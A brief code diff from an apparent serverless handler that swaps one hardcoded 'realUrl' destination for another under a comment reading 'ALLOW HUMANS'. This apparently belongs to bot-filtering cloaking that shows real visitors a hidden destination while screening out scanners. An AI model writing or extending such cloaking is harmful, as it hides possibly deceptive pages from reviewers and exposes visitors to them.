@@ -394,7 +394,7 @@ export default async function handler(req, res) {
     }
 
     // ✅ ALLOW HUMANS
-    const realUrl = "https://www.vzmdad.site/inici/";
+    const realUrl = "https://www.meunomeconsultoria.site/f2/";
     const sessionId = crypto.randomUUID();
     const timestamp = Date.now();
     const payload = JSON.stringify({ realUrl, sessionId, timestamp });
